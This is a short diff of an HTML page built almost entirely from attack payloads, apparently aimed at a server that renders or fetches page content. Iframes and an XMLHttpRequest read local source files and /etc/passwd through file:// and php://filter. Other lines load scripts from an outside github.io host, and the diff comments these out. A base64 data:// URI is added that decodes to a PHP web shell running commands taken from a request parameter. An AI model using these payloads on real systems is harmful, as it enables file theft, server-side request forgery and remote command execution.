@@ -13,9 +13,9 @@
     <iframe src="file://main.py" width="400" height="400"></iframe>
     <iframe src="file://__pycache__" width="400" height="400"></iframe>
     <iframe src="file://__init__.py" width="400" height="400"></iframe>
-    <iframe src="php://filter/string.strip_tags/resource=/etc/passwd" width="400" height="400"></iframe>
-    <iframe src="https://anyquestions69.github.io/ssrfcurl.php" width="400" height="400"></iframe>
-    <iframe src="https://anyquestions69.github.io/script.php" width="400" height="400"></iframe>
+    <iframe src="data:" width="400" height="400"></iframe>
+    <!-- <iframe src="https://anyquestions69.github.io/ssrfcurl.php" width="400" height="400"></iframe>
+    <iframe src="https://anyquestions69.github.io/script.php" width="400" height="400"></iframe> -->
     <img
 src="data:image/gif;base64,R0lGODdhMAAwAPAAAAAAAP///ywAAAAAMAAw
 AAAC8IyPqcvt3wCcDkiLc7C0qwyGHhSWpjQu5yqmCYsapyuvUUlvONmOZtfzgFz
@@ -33,7 +33,7 @@ alt="Larry" />
         x.onload=function(){
         document.write(this.responseText)
         };
-        x.open("GET","php://filter/string.strip_tags/resource=/etc/passwd");
+        x.open("GET","data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=");
         x.send();
         console.log(window)
         </script>
